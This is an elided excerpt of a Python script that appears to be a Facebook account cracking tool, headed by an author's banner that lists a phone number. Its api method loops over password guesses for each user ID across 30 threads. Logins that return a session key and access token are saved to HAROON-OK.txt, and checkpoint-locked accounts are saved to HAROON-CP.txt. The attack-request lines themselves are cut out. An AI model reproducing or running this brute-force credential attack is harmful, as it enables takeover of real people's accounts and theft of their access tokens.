...
class Main:
 ...
 |...LOVER                                 
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : HAROON AHMAD   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSAPP : 03494462675
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : Haroon302/2009
...
\033[1;90m══════════════════════════════════════════════════
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [+] OK RESULTS SAVED IN -> HAROON_OK.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> HAROON_Cp.txt"%(Y))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>-] [HAROON] : %s/%s -> \033[0;92m [ HAROON-OK:%s ]- \033[0;91m[HAROON-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("HAROON-OK.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [HAROON-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("HAROON-CP.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
